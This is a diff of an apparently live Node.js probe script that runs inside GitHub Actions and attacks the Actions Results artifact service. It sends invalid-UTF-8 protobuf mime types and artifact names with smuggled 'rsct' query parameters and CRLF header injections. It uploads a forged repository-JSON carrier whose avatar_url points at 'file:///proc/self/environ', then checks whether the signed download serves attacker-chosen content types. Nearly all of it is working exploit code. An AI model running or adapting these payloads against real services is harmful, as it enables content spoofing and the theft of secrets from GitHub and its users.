@@ -1,24 +1,16 @@
 'use strict';
 
-// Minimal parser-confusion probe for Actions Results CreateArtifact.  The
-// matrix is intentionally small and logs no signed URLs or bearer tokens.
+// Final bounded GitHub Actions Results probe for Repo Cassette.
+// It checks two gaps left by the earlier matrix:
+//   1. invalid UTF-8 in protobuf StringValue mime_type;
+//   2. artifact-name influence on the signed REST download overrides.
+// Signed URLs and tokens are never printed.
 
 const crypto = require('node:crypto');
 const https = require('node:https');
 
 const SERVICE = 'github.actions.results.api.v1.ArtifactService';
-const ODD_TYPE = '\x85application/json';
-const ODD_HEX = Buffer.from(ODD_TYPE, 'latin1').toString('hex');
-
-function fail(message) { throw new Error(message); }
-
-function backendIds(token) {
-  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
-  const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
-  const fields = scope?.split(':') || [];
-  if (fields.length !== 3) fail('Actions.Results scope unavailable');
-  return {run: fields[1], job: fields[2]};
-}
+const ODD = Buffer.concat([Buffer.from([0x85]), Buffer.from('application/json')]);
 
 function request(url, {method = 'GET', headers = {}, body = null} = {}) {
   return new Promise((resolve, reject) => {
@@ -37,25 +29,12 @@ function request(url, {method = 'GET', headers = {}, body = null} = {}) {
   });
 }
 
-async function twirpRaw(method, token, body, contentType = 'application/json') {
-  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
-  return request(`${origin}/twirp/${SERVICE}/${method}`, {
-    method: 'POST',
-    headers: {
-      authorization: `Bearer ${token}`,
-      accept: contentType,
-      'content-type': contentType,
-      'content-length': String(body.length),
-    },
-    body,
-  });
-}
-
-async function twirpJson(method, token, value) {
-  const response = await twirpRaw(method, token, Buffer.from(JSON.stringify(value)));
-  let parsed = {};
-  try { parsed = JSON.parse(response.body.toString()); } catch {}
-  return {response, parsed};
+function idsFromToken(token) {
+  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
+  const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
+  const fields = scope?.split(':') || [];
+  if (fields.length !== 3) throw new Error('Actions.Results scope unavailable');
+  return {run: fields[1], job: fields[2]};
 }
 
 function varint(value) {
@@ -69,37 +48,51 @@ function varint(value) {
   return Buffer.from(out);
 }
 
-function fieldString(no, value) {
-  const data = Buffer.from(value);
+function fieldBytes(no, data) {
+  data = Buffer.from(data);
   return Buffer.concat([varint((no << 3) | 2), varint(data.length), data]);
 }
 
-function fieldInt(no, value) {
-  return Buffer.concat([varint(no << 3), varint(value)]);
-}
+function fieldString(no, value) { return fieldBytes(no, Buffer.from(value)); }
+function fieldInt(no, value) { return Buffer.concat([varint(no << 3), varint(value)]); }
+function fieldMimeBytes(data) { return fieldBytes(6, fieldBytes(1, data)); }
 
-function fieldMime(value) {
-  const wrapped = fieldString(1, value);
-  return Buffer.concat([varint((6 << 3) | 2), varint(wrapped.length), wrapped]);
-}
-
-function binaryCreate(ids, name, fields) {
+function binaryCreate(ids, name, mimeBytes) {
   return Buffer.concat([
     fieldString(1, ids.run),
     fieldString(2, ids.job),
     fieldString(3, name),
-    ...fields,
+    fieldInt(5, 7),
+    fieldMimeBytes(mimeBytes),
   ]);
 }
 
-function parseCreate(response, binary) {
-  if (!binary) {
-    try { return JSON.parse(response.body.toString()); } catch { return {}; }
-  }
+async function twirpRaw(method, token, body, type) {
+  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
+  return request(`${origin}/twirp/${SERVICE}/${method}`, {
+    method: 'POST',
+    headers: {
+      authorization: `Bearer ${token}`,
+      accept: type,
+      'content-type': type,
+      'content-length': String(body.length),
+    },
+    body,
+  });
+}
+
+async function twirpJson(method, token, value) {
+  const response = await twirpRaw(method, token, Buffer.from(JSON.stringify(value)), 'application/json');
+  let parsed = {};
+  try { parsed = JSON.parse(response.body.toString()); } catch {}
+  return {response, parsed};
+}
+
+function parseBinaryCreate(response) {
   const body = response.body;
   let pos = 0;
   let ok = false;
-  let signedUploadUrl = '';
+  let url = '';
   function readVarint() {
     let value = 0n;
     let shift = 0n;
@@ -122,138 +115,176 @@ function parseCreate(response, binary) {
       const length = Number(readVarint());
       const data = body.subarray(pos, pos + length);
       pos += length;
-      if (no === 2) signedUploadUrl = data.toString();
+      if (no === 2) url = data.toString();
     } else {
-      throw new Error(`unsupported response wire type ${wire}`);
+      throw new Error('unexpected protobuf response wire type');
     }
   }
-  return {ok, signed_upload_url: signedUploadUrl};
+  return {ok, signed_upload_url: url};
 }
 
-async function putBlob(url, body) {
+async function createJson(token, ids, name, version, mime) {
+  return twirpJson('CreateArtifact', token, {
+    workflow_run_backend_id: ids.run,
+    workflow_job_run_backend_id: ids.job,
+    name,
+    version,
+    mime_type: mime,
+  });
+}
+
+async function put(url, body) {
   return request(url, {
     method: 'PUT',
     headers: {
       'content-type': 'application/octet-stream',
       'content-length': String(body.length),
       'x-ms-blob-type': 'BlockBlob',
-      'x-ms-blob-content-type': ODD_TYPE,
+      'x-ms-blob-content-type': ODD.toString('latin1'),
     },
     body,
   });
 }
 
-function carrier(repositoryPath) {
-  return Buffer.from(JSON.stringify({
-    full_name: repositoryPath,
+function responseError(response) {
+  if (response.status < 400) return '';
+  return response.body.toString('utf8').replace(/[?&]sig=[^&" ]+/gi, '?sig=REDACTED').slice(0, 280);
+}
+
+function parseLocation(location) {
+  if (!location) return null;
+  const url = new URL(location);
+  const counts = {};
+  for (const key of url.searchParams.keys()) counts[key] = (counts[key] || 0) + 1;
+  const latinHex = value => Buffer.from(value || '', 'latin1').toString('hex');
+  return {
+    host: url.host,
+    pathHash: crypto.createHash('sha256').update(url.pathname).digest('hex').slice(0, 12),
+    keys: Object.keys(counts).sort(),
+    keyCounts: counts,
+    rscdHex: latinHex(url.searchParams.get('rscd')),
+    rsctHex: latinHex(url.searchParams.get('rsct')),
+  };
+}
+
+async function restDownload(repository, artifactId, expected) {
+  const first = await request(`https://api.github.com/repos/${repository}/actions/artifacts/${artifactId}/zip`, {
+    headers: {
+      accept: 'application/vnd.github.v3+json',
+      authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
+      'user-agent': 'repo-cassette-last-mile',
+    },
+  });
+  const location = first.headers.location || '';
+  const final = location ? await request(location, {headers: {'user-agent': 'repo-cassette-last-mile'}}) : first;
+  const type = Array.isArray(final.headers['content-type'])
+    ? final.headers['content-type'][0] : final.headers['content-type'] || '';
+  return {
+    firstStatus: first.status,
+    location: parseLocation(location),
+    finalStatus: final.status,
+    contentTypeHex: Buffer.from(type, 'latin1').toString('hex'),
+    bodyMatch: final.body.equals(expected),
+  };
+}
+
+function payload(repository, artifactId) {
+  const path = `${repository}/actions/artifacts/${artifactId}/zip`;
+  const document = {
+    full_name: path,
     owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-    description: 'Repo Cassette parser probe carrier',
+    description: 'last-mile carrier',
     stargazers_count: 0,
-  }));
+    padding: '',
+  };
+  const base = Buffer.from(JSON.stringify(document));
+  document.padding = 'A'.repeat(256 - base.length);
+  const body = Buffer.from(JSON.stringify(document));
+  if (body.length !== 256) throw new Error('payload padding failed');
+  return body;
 }
 
-function headerHex(response) {
-  const value = Array.isArray(response.headers['content-type'])
-    ? response.headers['content-type'][0] : response.headers['content-type'] || '';
-  return Buffer.from(value, 'latin1').toString('hex');
-}
-
-async function finish(label, create, token, ids, name, repository) {
+async function finalizeAccepted(token, ids, repository, label, name, create) {
   const uploadUrl = create.signed_upload_url || create.signedUploadUrl || '';
   if (!create.ok || !uploadUrl) return {label, accepted: false};
-  const placeholder = Buffer.from('{}');
-  const put = await putBlob(uploadUrl, placeholder);
-  const finalized = await twirpJson('FinalizeArtifact', token, {
+  const placeholder = Buffer.alloc(256, 0x20);
+  const upload = await put(uploadUrl, placeholder);
+  const final = await twirpJson('FinalizeArtifact', token, {
     workflow_run_backend_id: ids.run,
     workflow_job_run_backend_id: ids.job,
     name,
     size: String(placeholder.length),
   });
-  const artifactId = String(finalized.parsed.artifact_id || finalized.parsed.artifactId || '');
-  if (put.status < 200 || put.status >= 300 || !/^\d+$/.test(artifactId)) {
-    return {label, accepted: true, putStatus: put.status, finalizeStatus: finalized.response.status};
+  const artifactId = String(final.parsed.artifact_id || final.parsed.artifactId || '');
+  if (upload.status < 200 || upload.status >= 300 || !/^\d+$/.test(artifactId)) {
+    return {label, accepted: true, uploadStatus: upload.status, finalizeStatus: final.response.status};
   }
-  const repositoryPath = `${repository}/actions/artifacts/${artifactId}/zip`;
-  const body = carrier(repositoryPath);
-  await putBlob(uploadUrl, body);
-  const signed = await twirpJson('GetSignedArtifactURL', token, {
-    workflow_run_backend_id: ids.run,
-    workflow_job_run_backend_id: ids.job,
-    name,
-  });
-  const downloadUrl = signed.parsed.signed_url || signed.parsed.signedUrl || '';
-  const direct = downloadUrl ? await request(downloadUrl, {headers: {'user-agent': 'repo-cassette-parser-probe'}}) : null;
-  const contentTypeHex = direct ? headerHex(direct) : '';
-  const result = {
+  const body = payload(repository, artifactId);
+  await put(uploadUrl, body);
+  return {
     label,
     accepted: true,
-    createOk: true,
     artifactId,
-    repositoryPath,
-    directStatus: direct?.status || 0,
-    contentTypeHex,
-    bodyMatch: Boolean(direct?.body.equals(body)),
+    download: await restDownload(repository, artifactId, body),
   };
-  result.winner = result.directStatus === 200 && result.contentTypeHex === ODD_HEX && result.bodyMatch;
-  return result;
+}
+
+async function invalidUtf8Cases(token, ids, repository, nonce) {
+  const a = Buffer.from('application/json');
+  const specs = [
+    ['raw-nel-leading', Buffer.concat([Buffer.from([0x85]), a])],
+    ['raw-nel-trailing', Buffer.concat([a, Buffer.from([0x85])])],
+    ['overlong-nel-leading', Buffer.concat([Buffer.from([0xc1, 0x85]), a])],
+    ['valid-u0085-leading', Buffer.concat([Buffer.from([0xc2, 0x85]), a])],
+  ];
+  for (const [index, [label, mime]] of specs.entries()) {
+    const name = `last-mile-utf8-${nonce}-${index}`;
+    const response = await twirpRaw(
+      'CreateArtifact', token, binaryCreate(ids, name, mime), 'application/protobuf',
+    );
+    let create = {};
+    try { create = parseBinaryCreate(response); } catch {}
+    const result = {
+      label,
+      createStatus: response.status,
+      error: responseError(response),
+      ...await finalizeAccepted(token, ids, repository, label, name, create),
+    };
+    console.log(`LAST_MILE_UTF8 ${JSON.stringify(result)}`);
+  }
+}
+
+async function nameCases(token, ids, repository, nonce) {
+  const suffixes = [
+    ['control', '.json'],
+    ['question', '.json?rsct=%85application%2Fjson'],
+    ['ampersand', '.json&rsct=%85application%2Fjson'],
+    ['encoded', '.json%26rsct%3D%2585application%252Fjson'],
+    ['fragment', '.json#rsct=%85application%2Fjson'],
+    ['nel', `.json${String.fromCharCode(0x85)}application-json`],
+    ['crlf', '.json\r\nrsct: %85application/json'],
+  ];
+  for (const [index, [label, suffix]] of suffixes.entries()) {
+    const name = `last-mile-name-${nonce}-${index}${suffix}`;
+    const created = await createJson(token, ids, name, 6, ODD.toString('latin1'));
+    const result = {
+      label,
+      createStatus: created.response.status,
+      error: responseError(created.response),
+      ...await finalizeAccepted(token, ids, repository, label, name, created.parsed),
+    };
+    console.log(`LAST_MILE_NAME ${JSON.stringify(result)}`);
+  }
 }
 
 async function main() {
   const token = process.env.ACTIONS_RUNTIME_TOKEN;
   const repository = process.env.GITHUB_REPOSITORY;
-  if (!token || !repository) fail('Actions environment incomplete');
-  const ids = backendIds(token);
-  const nonce = `${process.env.GITHUB_RUN_ID}-${crypto.randomBytes(4).toString('hex')}`;
-  const q = JSON.stringify;
-  const base = (name) => `"workflow_run_backend_id":${q(ids.run)},"workflow_job_run_backend_id":${q(ids.job)},"name":${q(name)}`;
-  const jsonSpecs = [
-    ['json-control-v7-nel', (n) => `{${base(n)},"version":7,"mime_type":${q(ODD_TYPE)}}`],
-    ['json-version-6-then-7', (n) => `{${base(n)},"version":6,"version":7,"mime_type":${q(ODD_TYPE)}}`],
-    ['json-version-7-then-6', (n) => `{${base(n)},"version":7,"version":6,"mime_type":${q(ODD_TYPE)}}`],
-    ['json-mime-valid-alias-nel', (n) => `{${base(n)},"version":7,"mime_type":"application/json","mimeType":${q(ODD_TYPE)}}`],
-    ['json-mime-nel-alias-valid', (n) => `{${base(n)},"version":7,"mime_type":${q(ODD_TYPE)},"mimeType":"application/json"}`],
-    ['json-mime-valid-then-nel', (n) => `{${base(n)},"version":7,"mime_type":"application/json","mime_type":${q(ODD_TYPE)}}`],
-    ['json-mime-nel-then-valid', (n) => `{${base(n)},"version":7,"mime_type":${q(ODD_TYPE)},"mime_type":"application/json"}`],
-    ['json-wrapper-object', (n) => `{${base(n)},"version":7,"mime_type":{"value":${q(ODD_TYPE)}}}`],
-    ['json-version-string', (n) => `{${base(n)},"version":"7","mime_type":${q(ODD_TYPE)}}`],
-    ['json-version-float', (n) => `{${base(n)},"version":7.0,"mime_type":${q(ODD_TYPE)}}`],
-    ['json-version-rounds-to-7', (n) => `{${base(n)},"version":6.9999999999999996,"mime_type":${q(ODD_TYPE)}}`],
-    ['json-version-wrap-high', (n) => `{${base(n)},"version":4294967303,"mime_type":${q(ODD_TYPE)}}`],
-  ];
-  const binarySpecs = [
-    ['proto-version-6-then-7', [fieldInt(5, 6), fieldInt(5, 7), fieldMime(ODD_TYPE)]],
-    ['proto-version-7-then-6', [fieldInt(5, 7), fieldInt(5, 6), fieldMime(ODD_TYPE)]],
-    ['proto-version-wrap-high', [fieldInt(5, 4294967303n), fieldMime(ODD_TYPE)]],
-    ['proto-mime-valid-then-nel', [fieldInt(5, 7), fieldMime('application/json'), fieldMime(ODD_TYPE)]],
-    ['proto-mime-nel-then-valid', [fieldInt(5, 7), fieldMime(ODD_TYPE), fieldMime('application/json')]],
-  ];
-  const results = [];
-  for (const [index, spec] of [...jsonSpecs, ...binarySpecs].entries()) {
-    const [label, make] = spec;
-    const name = `repo-cassette-parser-${nonce}-${index}`;
-    const binary = index >= jsonSpecs.length;
-    const body = binary ? binaryCreate(ids, name, make) : Buffer.from(make(name));
-    const response = await twirpRaw('CreateArtifact', token, body, binary ? 'application/protobuf' : 'application/json');
-    let create = {};
-    try { create = parseCreate(response, binary); } catch (error) { create = {parseError: error.message}; }
-    const errorText = response.status >= 400 ? response.body.toString().slice(0, 500) : '';
-    const row = {
-      label,
-      encoding: binary ? 'protobuf' : 'json',
-      createStatus: response.status,
-      createOk: Boolean(create.ok),
-      error: errorText,
-      ...await finish(label, create, token, ids, name, repository),
-    };
-    results.push(row);
-    console.log(`PARSER_RESULT ${JSON.stringify(row)}`);
-    if (row.winner) {
-      console.log(`PARSER_WINNER ${JSON.stringify(row)}`);
-      return;
-    }
-  }
-  const control = results.find(x => x.label === 'json-control-v7-nel');
-  console.log(`PARSER_SUMMARY ${JSON.stringify({tested: results.length, invalidMimeControl: control})}`);
+  if (!token || !repository || !process.env.GITHUB_TOKEN) throw new Error('Actions environment incomplete');
+  const ids = idsFromToken(token);
+  const nonce = `${process.env.GITHUB_RUN_ID}-${crypto.randomBytes(3).toString('hex')}`;
+  await invalidUtf8Cases(token, ids, repository, nonce);
+  await nameCases(token, ids, repository, nonce);
 }
 
 main().catch(error => {
